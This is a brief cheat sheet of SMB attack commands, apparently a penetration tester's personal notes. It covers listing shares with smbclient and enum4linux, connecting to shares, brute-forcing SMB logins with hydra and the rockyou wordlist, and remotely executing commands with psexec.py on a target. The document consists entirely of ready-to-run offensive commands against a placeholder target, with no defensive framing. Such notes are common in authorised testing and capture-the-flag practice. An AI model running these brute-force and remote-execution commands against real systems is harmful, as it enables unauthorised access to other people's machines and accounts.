smb

date: February 23, 2026
tags:

list share:

smbclient -L //$target -N

or

enum4linux -a $target

Connect to a Share

smbclient //$target/<share>

With username:

smbclient //target/<share> -U username

Brute Force SMB Credentials with user

hydra -l administrator -P /usr/share/wordlists/rockyou.txt smb://$target

Brute Force SMB Credentials with password

hydra -L users.txt -p "12312342"  smb://$target

Brute Force SMB Credentials with nothing

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt smb://<ip>

execute files remotely

psexec.py DOMAIN/USER:PASSWORD@TARGET_IP
